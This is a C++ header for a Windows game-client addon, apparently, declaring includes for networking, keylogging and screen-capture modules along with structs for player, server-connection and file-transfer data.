#pragma once

#define WIN32_LEAN_AND_MEAN 
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ws2_32.lib")



#include <windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

#include <cstdio>
#include <fstream>
#include <iostream>
#include <limits>
#include <queue>
#include <stack>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <string>
#include <time.h>
#include <vector>

#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/regex.hpp>
#include <boost/shared_ptr.hpp>
#include <boost/thread.hpp>
#include <boost/unordered_map.hpp>

#include "fs.h"
#include "keylog.h"
#include "process.h"
#include "screen.h"
#include "string.h"
#include "tcpsocket.h"
#include "transfer.h"




void addonDebug(char *text, ...);





struct PlayerData
{
	char Name[24];
	int Serial;
};



struct ServerData
{
	char IP[16];
	char Password[256];
	int Port;
};



struct TransferData
{
	bool Active;
	bool Sending;

	std::size_t Length;
};



class addonData
{

public:

	static void Thread();
	static void DebugThread();

	addonData();
	~addonData();

	struct PlayerData Player;
	struct ServerData Server;
	struct TransferData Transfer;
};